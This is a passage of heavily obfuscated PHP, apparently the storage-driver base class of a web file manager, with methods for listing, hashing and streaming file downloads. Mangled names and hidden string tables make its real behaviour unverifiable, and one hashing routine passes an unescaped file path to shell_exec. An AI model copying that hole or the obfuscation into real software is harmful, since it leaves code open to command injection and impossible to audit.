$_SERVER[÷åé¼î]; $ËÛ®·‹Û = rtrim(strtolower($ËÛ®·‹Û), $¶­ş¡ö[8]) . $¶­ş¡ö[8]; $Õôß§¤ = rtrim(strtolower($Õôß§¤), $¶­ş¡ö[8]) . $¶­ş¡ö[8]; $£•ÂÔ½ = strpos($Õôß§¤, $ËÛ®·‹Û) === 0; return $£•ÂÔ½; } public function getType() { $œŠÂˆ¯ =& $_SERVER[÷åé¼î]; $‡ÈÎû‚— = str_replace($œŠÂˆ¯[77], $œŠÂˆ¯[12], get_class($this)); return strtolower($‡ÈÎû‚—); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($íÓ¹¡„ô, $òÎ²Ö˜Î) { $‘ â›Ó½ =& $_SERVER[÷åé¼î]; $ÖØ¨«Æ = rtrim($íÓ¹¡„ô, $‘ â›Ó½[8]) . $‘ â›Ó½[8] . $òÎ²Ö˜Î; $òéçˆ¼è = $this->exist($ÖØ¨«Æ); return $òéçˆ¼è ? $ÖØ¨«Æ : !1; } public function setModifyTime($ÀÛµ–‰, $ÖêóäÔ¢ = '') { } public function renameObject($¦‰·âÜá, $‚ÎÖÍÛ) { $šŸ¥ÈëŸ = $‚ÎÖÍÛ; $¦‰·âÜá = $this->getPathOuter($¦‰·âÜá); $‚ÎÖÍÛ = $this->pathFather($¦‰·âÜá) . $‚ÎÖÍÛ; $§Â”¸ö = IO::copy($¦‰·âÜá, $this->pathFather($¦‰·âÜá), REPEAT_RENAME_FOLDER, $šŸ¥ÈëŸ); if ($§Â”¸ö) { IO::remove($¦‰·âÜá); } return $§Â”¸ö ? $‚ÎÖÍÛ : !1; } public function tempFile($ÒÖ½æò¸ = '', $Ú‚æØ½Ã = '') { if (!$ÒÖ½æò¸) { $ÒÖ½æò¸ = rand_string(15); } $¾şıõèï = TEMP_FILES . rand_string(15) . $_SERVER[÷åé¼î][8]; @mkdir($¾şıõèï, DEFAULT_PERRMISSIONS, !0); $û“Û®Ø = $¾şıõèï . $ÒÖ½æò¸; @touch($û“Û®Ø); if ($Ú‚æØ½Ã) { file_put_contents($û“Û®Ø, $Ú‚æØ½Ã); } return $û“Û®Ø; } public function tempFileRemve($ÑÎ¹¯Ô) { @unlink($ÑÎ¹¯Ô); @rmdir($this->pathFather($ÑÎ¹¯Ô)); } public function mkfile($ôğ ¡½Ş, $×ë¼’Ï¿ = '', $ğüæïµ = REPEAT_RENAME) { } public function mkdir($øæêÉÑ¼, $ıİ—ó¢µ = REPEAT_SKIP) { } public function delFile($“‰îœÆ ) { } public function delFolder($èƒ¢İ„) { } public function copyFile($òºï–Ìˆ, $ôğÚáé¡) { } public function moveFile($­¥ŠêÁ, $õŞ÷Å€¦) { } public function remove($÷õıß©Ç) { if ($this->isFile($÷õıß©Ç)) { return $this->delFile($÷õıß©Ç); } return $this->delFolder($÷õıß©Ç); } public function rename($Ê¹ÇÑ, $ñ°ÊÚ¬ß) { } public function exist($Ü³şûÌ) { } public function findByHash($ãı¥®’ = '', $³™ù€ƒ = '') { return !1; } public function isFile($Æ‹ƒ€) { } public function isFolder($†’‹Ş ¶) { } public function size($ìÑ¾·†¿) { } public function info($¦ôıãûË) { } public function infoSimple($Îë“®Ñ›) { return $this->info($Îë“®Ñ›); } public function infoAuth($ÙâÇ´¾ã) { return $this->info($ÙâÇ´¾ã); } public function infoFull($×Œ®€Ê…) { return $this->info($×Œ®€Ê…); } public function infoFullSimple($ö‹ï”¯æ) { return $this->info($ö‹ï”¯æ); } public function infoWithChildren($äšçœ±œ) { $³­¶’ĞÖ =& $_SERVER[÷åé¼î]; static $ó¬éˆˆ = array(); if (isset($ó¬éˆˆ[$äšçœ±œ])) { return $ó¬éˆˆ[$äšçœ±œ]; } $³Œ“œÌ = $this->info($äšçœ±œ); if ($³Œ“œÌ && $³Œ“œÌ[$³­¶’ĞÖ[33]] == $³­¶’ĞÖ[78]) { $ÊÇ íÏ® = array($³­¶’ĞÖ[79] => 0, $³­¶’ĞÖ[80] => 0, $³­¶’ĞÖ[81] => 0); $this->infoChildren($äšçœ±œ, $ÊÇ íÏ®); $³Œ“œÌ[$³­¶’ĞÖ[79]] = $ÊÇ íÏ®[$³­¶’ĞÖ[79]]; $³Œ“œÌ[$³­¶’ĞÖ[82]] = array($³­¶’ĞÖ[83] => $ÊÇ íÏ®[$³­¶’ĞÖ[80]], $³­¶’ĞÖ[84] => $ÊÇ íÏ®[$³­¶’ĞÖ[81]]); $ó¬éˆˆ[$äšçœ±œ] = $³Œ“œÌ; } return $³Œ“œÌ; } public function listPath($Ñ˜¼§ñ‚, $Æá¨êıç = false) { } public function has($Å†ÇàÁ¨, $ÔÓè£™ = false, $ÉÛš = false) { } public function canRead($‚¤‡±„Ç) { } public function canWrite($š†·È¦Ù) { } public function getContent($±î÷¥ñõ) { } public function setContent($ÏòÔıïË, $¸é‰”É = '') { } protected function infoChildren($üÇ¶ª•Ã, &$½€õ…¼¾) { $¿ô¼ı¶Ú =& $_SERVER[÷åé¼î]; check_abort_echo(); $“–İ†ö§ = $this->listPath($üÇ¶ª•Ã, !0); $“–İ†ö§ = array_merge($“–İ†ö§[$¿ô¼ı¶Ú[85]], $“–İ†ö§[$¿ô¼ı¶Ú[86]]); foreach ($“–İ†ö§ as $“Ï¦Ù „) { if ($“Ï¦Ù „[$¿ô¼ı¶Ú[33]] == $¿ô¼ı¶Ú[78]) { $½€õ…¼¾[$¿ô¼ı¶Ú[81]]++; $×äİùıÜ = $this->getPathInner($“Ï¦Ù „[$¿ô¼ı¶Ú[87]]); $this->infoChildren($×äİùıÜ, $½€õ…¼¾); } else { $½€õ…¼¾[$¿ô¼ı¶Ú[80]]++; $½€õ…¼¾[$¿ô¼ı¶Ú[79]] += $“Ï¦Ù „[$¿ô¼ı¶Ú[79]]; } } } public function fileSubstr($ƒä²¹ï›, $¾·§êŒÃ, $±ÓæÖÜ) { } public function listAll($óÌµĞ¥) { } public function listAllMake($èÕË›ñ‹, &$‰ššñı) { $–ñŞÀŠÉ =& $_SERVER[÷åé¼î]; check_abort_echo(); $à°÷´ñÑ = $this->listPath($èÕË›ñ‹, !0); if (!$à°÷´ñÑ) { return; } $²şŸº² = array_merge($à°÷´ñÑ[$–ñŞÀŠÉ[85]], $à°÷´ñÑ[$–ñŞÀŠÉ[86]]); foreach ($²şŸº² as $ÃÅ©Š²) { $ìÈª›…™ = $ÃÅ©Š²[$–ñŞÀŠÉ[33]] == $–ñŞÀŠÉ[78]; $ò¼‹êÑÂ = array($–ñŞÀŠÉ[87] => $ÃÅ©Š²[$–ñŞÀŠÉ[87]], $–ñŞÀŠÉ[78] => $ìÈª›…™); if (isset($ÃÅ©Š²[$–ñŞÀŠÉ[79]])) { $ò¼‹êÑÂ[$–ñŞÀŠÉ[79]] = $ÃÅ©Š²[$–ñŞÀŠÉ[79]]; } if (isset($ÃÅ©Š²[$–ñŞÀŠÉ[88]])) { $ò¼‹êÑÂ[$–ñŞÀŠÉ[88]] = $ÃÅ©Š²[$–ñŞÀŠÉ[88]]; } if (!$ìÈª›…™) { $‰ššñı[] = $ò¼‹êÑÂ; continue; } $‰ššñı[] = $ò¼‹êÑÂ; $ ¾°‚´ = $ÃÅ©Š²[$–ñŞÀŠÉ[87]]; $å„şé”Ÿ = $this->pathDriver; if (substr($ÃÅ©Š²[$–ñŞÀŠÉ[87]], 0, strlen($å„şé”Ÿ)) == $å„şé”Ÿ) { $ ¾°‚´ = substr($ ¾°‚´, strlen($å„şé”Ÿ)); } $this->listAllMake($ ¾°‚´, $‰ššñı); } } public function listAllSimple($«®àµò‘, $´¤Ş¥ÎÆ = false) { $¾İİÈÂ¦ = $this->listAll($«®àµò‘); return $this->listAllSimpleMake($¾İİÈÂ¦, $this->getPathOuter($«®àµò‘), $´¤Ş¥ÎÆ); } public function listAllSimpleMake($€Áö¨ê, $ëú¤Í¶©, $“°Çİ•) { $…Ú¨ƒ…Ò =& $_SERVER[÷åé¼î]; $¿Ş·¡ƒÜ = array(); $ëú¤Í¶© = rtrim(get_path_father($ëú¤Í¶©), $…Ú¨ƒ…Ò[8]) . $…Ú¨ƒ…Ò[8]; foreach ($€Áö¨ê as $Õ“äÙÄ) { $úŒÅªä  = array($…Ú¨ƒ…Ò[87] => $Õ“äÙÄ[$…Ú¨ƒ…Ò[87]], $…Ú¨ƒ…Ò[89] => $Õ“äÙÄ[$…Ú¨ƒ…Ò[87]], $…Ú¨ƒ…Ò[78] => $Õ“äÙÄ[$…Ú¨ƒ…Ò[78]]); if (isset($Õ“äÙÄ[$…Ú¨ƒ…Ò[79]]) && !$Õ“äÙÄ[$…Ú¨ƒ…Ò[78]]) { $úŒÅªä [$…Ú¨ƒ…Ò[79]] = $Õ“äÙÄ[$…Ú¨ƒ…Ò[79]]; } if (isset($Õ“äÙÄ[$…Ú¨ƒ…Ò[88]])) { $úŒÅªä [$…Ú¨ƒ…Ò[88]] = $Õ“äÙÄ[$…Ú¨ƒ…Ò[88]]; } if (is_array($Õ“äÙÄ[$…Ú¨ƒ…Ò[90]])) { $úŒÅªä [$…Ú¨ƒ…Ò[89]] = $Õ“äÙÄ[$…Ú¨ƒ…Ò[90]][$…Ú¨ƒ…Ò[87]]; $úŒÅªä [$…Ú¨ƒ…Ò[79]] = $Õ“äÙÄ[$…Ú¨ƒ…Ò[90]][$…Ú¨ƒ…Ò[79]]; $úŒÅªä [$…Ú¨ƒ…Ò[88]] = $Õ“äÙÄ[$…Ú¨ƒ…Ò[90]][$…Ú¨ƒ…Ò[88]]; } else { if (substr($Õ“äÙÄ[$…Ú¨ƒ…Ò[87]], 0, strlen($ëú¤Í¶©)) == $ëú¤Í¶©) { $úŒÅªä [$…Ú¨ƒ…Ò[87]] = substr($Õ“äÙÄ[$…Ú¨ƒ…Ò[87]], strlen($ëú¤Í¶©)); } } $‘êã¾¥ù = $Õ“äÙÄ[$…Ú¨ƒ…Ò[78]] ? $…Ú¨ƒ…Ò[8] : $…Ú¨ƒ…Ò[12]; $úŒÅªä [$…Ú¨ƒ…Ò[89]] = rtrim($úŒÅªä [$…Ú¨ƒ…Ò[89]], $…Ú¨ƒ…Ò[8]) . $‘êã¾¥ù; $úŒÅªä [$…Ú¨ƒ…Ò[87]] = $…Ú¨ƒ…Ò[8] . trim($úŒÅªä [$…Ú¨ƒ…Ò[87]], $…Ú¨ƒ…Ò[8]) . $‘êã¾¥ù; if (!$“°Çİ•) { $šùÁ•¸å = explode($…Ú¨ƒ…Ò[8], trim($úŒÅªä [$…Ú¨ƒ…Ò[87]], $…Ú¨ƒ…Ò[8])); $úŒÅªä [$…Ú¨ƒ…Ò[87]] = $…Ú¨ƒ…Ò[8] . implode($…Ú¨ƒ…Ò[8], array_slice($šùÁ•¸å, 1)) . $‘êã¾¥ù; } $¿Ş·¡ƒÜ[] = $úŒÅªä ; } return array_sort_by($¿Ş·¡ƒÜ, $…Ú¨ƒ…Ò[87]); } public function upload($–àâ¥ØÖ, $´—œæëÁ, $ÃµãóÃş = false, $Ï•“À = REPEAT_REPLACE) { } public function uploadFileByID($¥º€ˆé–, $ç¢À¢Á, $‰ºğ“—Á) { } public function uploadFileByPath($‘¸î”Œø, $­ªÂ§¾, $üùâíª¡ = array()) { } public function isUploadServer() { $ª–¡ã ü =& $_SERVER[÷åé¼î]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ª–¡ã ü[91]) { return !0; } return $GLOBALS[$ª–¡ã ü[6]][$ª–¡ã ü[92]][$ª–¡ã ü[93]]; } public function isFileOutServer() { $ëÈªı§¢ =& $_SERVER[÷åé¼î]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ëÈªı§¢[91]) { return !0; } return $GLOBALS[$ëÈªı§¢[6]][$ëÈªı§¢[92]][$ëÈªı§¢[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($é¿ä«¿‰) { $É¶ÍØæÒ =& $_SERVER[÷åé¼î]; if (!$this->isCdnHost()) { return $é¿ä«¿‰; } return str_replace(trim(get_url_root($é¿ä«¿‰), $É¶ÍØæÒ[8]), trim($this->cdnHost, $É¶ÍØæÒ[8]), $é¿ä«¿‰); } public function uploadLink($øäÏãì , $‰ÃÔº‡§ = 0) { $ÒúÎ†Íç =& $_SERVER[÷åé¼î]; if ($this->isUploadServer()) { return; } $¨µöÁäÙ = $this->getType(); if (!in_array($¨µöÁäÙ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ôé‹¼­ = 1024 * 1024 * 10; $ªŠÕÑƒÍ = $‰ÃÔº‡§ <= $ôé‹¼­ ? $ÒúÎ†Íç[95] : $ÒúÎ†Íç[96]; $é©³²š = (!$‰ÃÔº‡§ ? 1 : ceil($‰ÃÔº‡§ / pow(1024, 3))) * 3600 * 4; $ÏåºÕ› = $this->{$ªŠÕÑƒÍ}($øäÏãì , $é©³²š); if ($ÏåºÕ›) { $ÏåºÕ›[$ÒúÎ†Íç[97]] = $øäÏãì ; $ÏåºÕ›[$ÒúÎ†Íç[98]] = $¨µöÁäÙ; } return $ÏåºÕ›; } public function uploadFormData($øàñ„º¦, $–ø‘ú© = 3600) { } public function multiUploadFormData($¡ÔõùÔ, $ş˜¿­ş = 3600) { } public function download($•™ºÄğŸ, $ÆĞœÁğº) { } public function ext($â¿±…êÖ) { $Ëáò‡Õü =& $_SERVER[÷åé¼î]; if (strpos($â¿±…êÖ, $Ëáò‡Õü[8]) === -1) { $Ó¦ ü¬¼ = $â¿±…êÖ; } else { $Ó¦ ü¬¼ = $this->pathThis($â¿±…êÖ); } $ßÓÑ’Ûî = $Ëáò‡Õü[12]; if (strstr($Ó¦ ü¬¼, $Ëáò‡Õü[10])) { $ßÓÑ’Ûî = substr($Ó¦ ü¬¼, strrpos($Ó¦ ü¬¼, $Ëáò‡Õü[10]) + 1); $ßÓÑ’Ûî = strtolower($ßÓÑ’Ûî); } if (strlen($ßÓÑ’Ûî) > 3 && preg_match($Ëáò‡Õü[99], $ßÓÑ’Ûî, $©ëˆ—Ëæ)) { $ßÓÑ’Ûî = $Ëáò‡Õü[12]; } return $ßÓÑ’Ûî; } public function pathThis($Öéé¥×) { $×Ôğµ¨‰ =& $_SERVER[÷åé¼î]; $Öéé¥× = str_replace($×Ôğµ¨‰[100], $×Ôğµ¨‰[8], rtrim($Öéé¥×, $×Ôğµ¨‰[8])); $ÄÑò = strrpos($Öéé¥×, $×Ôğµ¨‰[8]); if ($ÄÑò === !1) { return $Öéé¥×; } return substr($Öéé¥×, $ÄÑò + 1); } public function pathFather($ÄÔÒšÄ) { $´‹ú¶ =& $_SERVER[÷åé¼î]; $ÄÔÒšÄ = str_replace($´‹ú¶[100], $´‹ú¶[8], rtrim($ÄÔÒšÄ, $´‹ú¶[8])); $ Òò›ÀÏ = strrpos($ÄÔÒšÄ, $´‹ú¶[8]); if ($ Òò›ÀÏ === !1) { return $´‹ú¶[12]; } return substr($ÄÔÒšÄ, 0, $ Òò›ÀÏ + 1); } public function hashSimple($ŒÎÏ–¼£) { $‹™ÑÂã« =& $_SERVER[÷åé¼î]; if (!$ŒÎÏ–¼£) { return md5($‹™ÑÂã«[12]); } $¡şèÌ³¦ = $this->size($ŒÎÏ–¼£); $…±‹Æéğ = 200; $û””±ÔÆ = 50; if ($¡şèÌ³¦ <= $…±‹Æéğ * $û””±ÔÆ) { return $this->hashMd5($ŒÎÏ–¼£) . $¡şèÌ³¦; } $‹È’œŸõ = intval($¡şèÌ³¦ / $û””±ÔÆ); $¨›È—í¾ = $‹™ÑÂã«[12]; for ($ãÁş†Ì = 0; $ãÁş†Ì < $û””±ÔÆ; $ãÁş†Ì++) { $¨›È—í¾ .= $this->fileSubstr($ŒÎÏ–¼£, $‹È’œŸõ * $ãÁş†Ì, $…±‹Æéğ); } $¨›È—í¾ .= $this->fileSubstr($ŒÎÏ–¼£, $¡şèÌ³¦ - $…±‹Æéğ, $…±‹Æéğ); return md5($¨›È—í¾) . $¡şèÌ³¦; } public static $md5Cache = array(); public function hashMd5($‘ó ÷ÅÄ) { if (!$‘ó ÷ÅÄ) { return md5($_SERVER[÷åé¼î][12]); } $‘ó ÷ÅÄ = $this->iconvSystem($‘ó ÷ÅÄ); if (isset(self::$md5Cache[$‘ó ÷ÅÄ])) { return self::$md5Cache[$‘ó ÷ÅÄ]; } self::$md5Cache[$‘ó ÷ÅÄ] = $this->hashMd5Shell($‘ó ÷ÅÄ); if (!self::$md5Cache[$‘ó ÷ÅÄ]) { self::$md5Cache[$‘ó ÷ÅÄ] = @md5_file($‘ó ÷ÅÄ); } return self::$md5Cache[$‘ó ÷ÅÄ]; } private function hashMd5Shell($ŞŞêôñò) { $âìîÉ»Ÿ =& $_SERVER[÷åé¼î]; if (!$ŞŞêôñò) { return md5($âìîÉ»Ÿ[12]); } if (!function_exists($âìîÉ»Ÿ[101])) { return !1; } $èÔÃ‚Ç” = array($âìîÉ»Ÿ[102], $âìîÉ»Ÿ[103]); $Ø…¬î¬¦ = Cache::get($âìîÉ»Ÿ[104]); if (!$Ø…¬î¬¦) { $¬–§„Ğ = BASIC_PATH . $âìîÉ»Ÿ[105]; $”ï’£± = md5_file($¬–§„Ğ); $Ø…¬î¬¦ = $âìîÉ»Ÿ[106]; foreach ($èÔÃ‚Ç” as $ùÙŠ‰ß÷) { $Ï¨öÀÅå = shell_exec($ùÙŠ‰ß÷ . "\40\42{$¬–§„Ğ}\x22"); if ($Ï¨öÀÅå && substr(trim($Ï¨öÀÅå), 0, 32) == $”ï’£±) { $Ø…¬î¬¦ = $ùÙŠ‰ß÷; break; } } Cache::set($âìîÉ»Ÿ[104], $Ø…¬î¬¦, 3600); } if ($Ø…¬î¬¦ == $âìîÉ»Ÿ[106]) { return !1; } $Ï¨öÀÅå = shell_exec($Ø…¬î¬¦ . "\40\42{$ŞŞêôñò}\42"); $Ï¨öÀÅå = str_replace($âìîÉ»Ÿ[107], $âìîÉ»Ÿ[12], $Ï¨öÀÅå); return substr($Ï¨öÀÅå, 0, 32); } public function link($¤»úîâŠ) { return $¤»úîâŠ; } public function fileOut($¤ŠöèàÅ, $ŠÊÒµ´ = false, $ë²Ìú¹¶ = false, $ˆÖÓá¢ı = '') { $Òü…‘Ş‹ =& $_SERVER[÷åé¼î]; $this->cacheMethod(null, null); if (!$¤ŠöèàÅ || !$this->exist($¤ŠöèàÅ)) { show_json(LNG($Òü…‘Ş‹[108]), !1, $ë²Ìú¹¶); } $ìãœş‰› = $this->getType() == $Òü…‘Ş‹[109]; $”¬û™ÊÒ = $GLOBALS[$Òü…‘Ş‹[6]][$Òü…‘Ş‹[92]][$Òü…‘Ş‹[110]][$Òü…‘Ş‹[111]]; $áÑáùÄ× = (double) $GLOBALS[$Òü…‘Ş‹[6]][$Òü…‘Ş‹[92]][$Òü…‘Ş‹[110]][$Òü…‘Ş‹[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¸¥òÛ‹» = $this->infoFull($¤ŠöèàÅ); $ëü¨¿‚Â = $¸¥òÛ‹»[$Òü…‘Ş‹[79]]; $ƒ¶šî­š = gmdate($Òü…‘Ş‹[113], $¸¥òÛ‹»[$Òü…‘Ş‹[88]]); $ğçøÀ“ò = $ë²Ìú¹¶ ? $ë²Ìú¹¶ : $this->iconvApp($¸¥òÛ‹»[$Òü…‘Ş‹[32]]); $ğÛ½²·“ = 0; $úŠ¹ÅıŒ = $ëü¨¿‚Â - 1; $¼´µıÛù = $this->ext($ğçøÀ“ò); if (in_array($¼´µıÛù, array($Òü…‘Ş‹[114], $Òü…‘Ş‹[115], $Òü…‘Ş‹[116], $Òü…‘Ş‹[117]))) { $¼´µıÛù = $Òü…‘Ş‹[118]; } if (in_array($¼´µıÛù, array($Òü…‘Ş‹[119]))) { $¼´µıÛù = $Òü…‘Ş‹[120]; } if (!$ˆÖÓá¢ı) { $ˆÖÓá¢ı = md5($ƒ¶šî­š . $ëü¨¿‚Â); } $ˆÖÓá¢ı = $Òü…‘Ş‹[121] . $ˆÖÓá¢ı . $Òü…‘Ş‹[121]; $Ò¢æáÑ = get_file_mime($¼´µıÛù); $Ûòç½¶ = !0; $Ûòç½¶ = isset($_GET[$Òü…‘Ş‹[122]]) ? !1 : !0; if ($ŠÊÒµ´ === !1 && !mime_support($Ò¢æáÑ)) { $Ò¢æáÑ = $Òü…‘Ş‹[123]; } header($Òü…‘Ş‹[124]); header($Òü…‘Ş‹[125] . $Ò¢æáÑ); $ÏïÙõäÖ = rawurlencode($ğçøÀ“ò); $ÏïÙõäÖ = $Òü…‘Ş‹[121] . $ÏïÙõäÖ . $Òü…‘Ş‹[126] . $ÏïÙõäÖ; if ($ŠÊÒµ´) { header($Òü…‘Ş‹[127]); header($Òü…‘Ş‹[128] . $ÏïÙõäÖ); } else { if ($Ûòç½¶) { header($Òü…‘Ş‹[129] . $ÏïÙõäÖ); } } $æ…Ñè’Ş = 3600 * 24 * 30; header($Òü…‘Ş‹[130]); header($Òü…‘Ş‹[131]); header($Òü…‘Ş‹[132] . $æ…Ñè’Ş); header($Òü…‘Ş‹[133] . gmdate($Òü…‘Ş‹[113], time() + $æ…Ñè’Ş) . $Òü…‘Ş‹[134]); if (isset($_SERVER[$Òü…‘Ş‹[135]]) && strtotime($_SERVER[$Òü…‘Ş‹[135]]) == $¸¥òÛ‹»[$Òü…‘Ş‹[88]]) { header($Òü…‘Ş‹[136], !0, 304); die; } if (isset($_SERVER[$Òü…‘Ş‹[137]]) && $_SERVER[$Òü…‘Ş‹[137]] == $ˆÖÓá¢ı) { header($Òü…‘Ş‹[138] . $ˆÖÓá¢ı, !0, 304); die; } header($Òü…‘Ş‹[138] . $ˆÖÓá¢ı); header($Òü…‘Ş‹[139] . $ƒ¶šî­š . $Òü…‘Ş‹[134]); header($Òü…‘Ş‹[140] . $ğçøÀ“ò); header($Òü…‘Ş‹[141]); header($Òü…‘Ş‹[142] . $ëü¨¿‚Â); header($Òü…‘Ş‹[143]); Hook::trigger($Òü…‘Ş‹[144], $¤ŠöèàÅ, $ëü¨¿‚Â, $ğçøÀ“ò, $¼´µıÛù); if (!$ŠÊÒµ´ && $¼´µıÛù == $Òü…‘Ş‹[145]) { if ($ëü¨¿‚Â > 1024 * 1024 * 5) { die; } $Ù”†ôåÎ = $this->getContent($¤ŠöèàÅ); $Ù”†ôåÎ = Html::clearSVG($Ù”†ôåÎ); header($Òü…‘Ş‹[146] . strlen($Ù”†ôåÎ)); echo $Ù”†ôåÎ; die; } $Ùøˆ½½ò = strtolower($_SERVER[$Òü…‘Ş‹[147]]); if ($ìãœş‰› && $Ùøˆ½½ò && $”¬û™ÊÒ) { if (strstr($Ùøˆ½½ò, $Òü…‘Ş‹[148])) { header($Òü…‘Ş‹[149] . $¤ŠöèàÅ); } else { if (strstr($Ùøˆ½½ò, $Òü…‘Ş‹[150])) { header($Òü…‘Ş‹[151] . $¤ŠöèàÅ); } else { if (strstr($Ùøˆ½½ò, $Òü…‘Ş‹[152])) { header($Òü…‘Ş‹[153] . $¤ŠöèàÅ); } } } if ($áÑáùÄ×) { header($Òü…‘Ş‹[154] . $áÑáùÄ×); } return; } if (isset($_SERVER[$Òü…‘Ş‹[155]])) { if (preg_match($Òü…‘Ş‹[156], $_SERVER[$Òü…‘Ş‹[155]], $¶İ©èèÅ)) { $ğÛ½²·“ = intval($¶İ©èèÅ[1]); $ğÛ½²·“ = $ğÛ½²·“ <= 0 ? 0 : ($ğÛ½²·“ >= $úŠ¹ÅıŒ ? $úŠ¹ÅıŒ : $ğÛ½²·“); if (!empty($¶İ©èèÅ[2])) { $«Ğ ‹è = intval($¶İ©èèÅ[2]); $úŠ¹ÅıŒ = $«Ğ ‹è < $ğÛ½²·“ ? $ğÛ½²·“ : ($«Ğ ‹è >= $úŠ¹ÅıŒ ? $úŠ¹ÅıŒ : $«Ğ ‹è); } } header($Òü…‘Ş‹[157]); header("\x43\x6f\x6e\x74\x65\x6e\164\55\122\x61\156\147\145\x3a\40\142\171\x74\145\163\x20{$ğÛ½²·“}\x2d{$úŠ¹ÅıŒ}\57" . $ëü¨¿‚Â); } else { header($Òü…‘Ş‹[158]); } header($Òü…‘Ş‹[159]); header($Òü…‘Ş‹[160]); $üÊ‰É¸ = !0; if ($_SERVER[$Òü…‘Ş‹[161]] == $Òü…‘Ş‹[162] && $ëü¨¿‚Â > 1204 * 1024 * 1024 * 2) { $üÊ‰É¸ = !1; } if ($üÊ‰É¸) { header($Òü…‘Ş‹[163] . ($úŠ¹ÅıŒ - $ğÛ½²·“ + 1)); } if ($_SERVER[$Òü…‘Ş‹[164]] == $Òü…‘Ş‹[165]) { return; } $äñÕÃ· = array($Òü…‘Ş‹[166] => !1, $Òü…‘Ş‹[167] => $ğÛ½²·“, $Òü…‘Ş‹[168] => $úŠ¹ÅıŒ, $Òü…‘Ş‹[169] => $¼´µıÛù, $Òü…‘Ş‹[170] => $¸¥òÛ‹», $Òü…‘Ş‹[171] => $Òü…‘Ş‹[12], $Òü…‘Ş‹[172] => 0); $äñÕÃ· = Hook::filter($Òü…‘Ş‹[173], $äñÕÃ·); $ğ¤—Ï¦ = 1024 * 300; $ØæÑ³À = 0; if ($áÑáùÄ×) { $ØæÑ³À = intval(1000 * 1000 * ($ğ¤—Ï¦ / $áÑáùÄ×)); } while ($ğÛ½²·“ <= $úŠ¹ÅıŒ) { $¥ß…ãæƒ = timeFloat(); check_abort(); $Î¬Ó™éÏ = $úŠ¹ÅıŒ - $ğÛ½²·“ + 1; if ($Î¬Ó™éÏ <= $ğ¤—Ï¦) { $ğ¤—Ï¦ = $Î¬Ó™éÏ; } $Ù”†ôåÎ = $this->fileSubstr($¤ŠöèàÅ, $ğÛ½²·“, $ğ¤—Ï¦); if ($äñÕÃ·[$Òü…‘Ş‹[166]]) { $äñÕÃ·[$Òü…‘Ş‹[171]] = $Ù”†ôåÎ; $äñÕÃ·[$Òü…‘Ş‹[172]] = $ğÛ½²·“; $äñÕÃ· = Hook::filter($Òü…‘Ş‹[174], $äñÕÃ·); $Ù”†ôåÎ = $äñÕÃ·[$Òü…‘Ş‹[171]]; } echo $Ù”†ôåÎ; $ğÛ½²·“ += $ğ¤—Ï¦; if ($ğ¤—Ï¦ == $Î¬Ó™éÏ) { $ğÛ½²·“ = $úŠ¹ÅıŒ + 1; } if ($ØæÑ³À) { $Ê­œ´÷ = intval(1000 * 1000 * (timeFloat() - $¥ß…ãæƒ)); $Æùš‰ÓÄ = $ØæÑ³À - $Ê­œ´÷; if ($Æùš‰ÓÄ > 5) { usleep($Æùš‰ÓÄ); } } } } public function fileOutServer($·ŸÅ‚, $ÄÀ¿ËËº = false, $£Çñ”¥Ë = false, $Ë«Õö¸Ú = '') { $this->fileOut($·ŸÅ‚, $ÄÀ¿ËËº, $£Çñ”¥Ë, $Ë«Õö¸Ú); } public function fileOutLink($©±‡ˆ˜î) { header($_SERVER[÷åé¼î][175] . $©±‡ˆ˜î); die; } public function cacheMethod($‡¹šİ«°, $¸Œ÷É’˜, $û¡°ä›Ï = null) { $ÑÄò£Æ =& $_SERVER[÷åé¼î]; static $ ¢³Ëçû = array(); $åÌ†ù“’ = $¸Œ÷É’˜ ? ltrim($this->getPathOuter($¸Œ÷É’˜), $ÑÄò£Æ[8]) : $ÑÄò£Æ[12]; $ÎÍ¶éòİ = $ÑÄò£Æ[176] . $‡¹šİ«° . $ÑÄò£Æ[177] . rtrim($åÌ†ù“’, $ÑÄò£Æ[8]); if (is_null($‡¹šİ«°)) { $ ¢³Ëçû = array(); return; } if (is_null($¸Œ÷É’˜)) { foreach ($ ¢³Ëçû as $ÎÍ¶éòİ => $·§Ì÷Óå) { if (!strstr($ÎÍ¶éòİ, $ÑÄò£Æ[176] . $‡¹šİ«° . $ÑÄò£Æ[178])) { continue; } unset($ ¢³Ëçû[$ÎÍ¶éòİ]); } return; } if (!is_null($û¡°ä›Ï)) { $ ¢³Ëçû[$ÎÍ¶éòİ] = $û¡°ä›Ï; return; } $éèºè‹¢ = isset($ ¢³Ëçû[$ÎÍ¶éòİ]) ? $ ¢³Ëçû[$ÎÍ¶éòİ] : null; if (!is_null($éèºè‹¢)) { return $éèºè‹¢; } $éèºè‹¢ = $this->{$‡¹šİ«°}($¸Œ÷É’˜); $ ¢³Ëçû[$ÎÍ¶éòİ] = $éèºè‹¢; return $éèºè‹¢; } public function cacheMethodInfoSet($ÁÉ‚¯ï, $‘ËÛµš–, $ÈŸ¡ÃŸ = false) { $ù¸áõ Â =& $_SERVER[÷åé¼î]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ù¸áõ Â[179], $ÁÉ‚¯ï, $‘ËÛµš–); $this->cacheMethod($ù¸áõ Â[180], $ÁÉ‚¯ï, $‘ËÛµš– ? !1 : !0); if (is_array($ÈŸ¡ÃŸ)) { $this->cacheMethod($ù¸áõ Â[181], $ÁÉ‚¯ï, $ÈŸ¡ÃŸ); } } public function fileOutImage($‹§ì¦²«, $øôá¸¨¸ = 250) { $ÜßÙ»„ü =& $_SERVER[÷åé¼î]; set_timeout(); if (substr($‹§ì¦²«, 0, 4) == $ÜßÙ»„ü[152]) { $this->fileOutLink($‹§ì¦²«); } $½¤±‘âÄ = $this->info($‹§ì¦²«); $Àı©œ¡Î = !1; $µéßéâ = isset($GLOBALS[$ÜßÙ»„ü[182]]) ? $GLOBALS[$ÜßÙ»„ü[182]] : array(); if ($µéßéâ && $µéßéâ[$ÜßÙ»„ü[183]] == $½¤±‘âÄ[$ÜßÙ»„ü[87]]) { $½¤±‘âÄ = $µéßéâ; $¼Ù›ÆŸ = 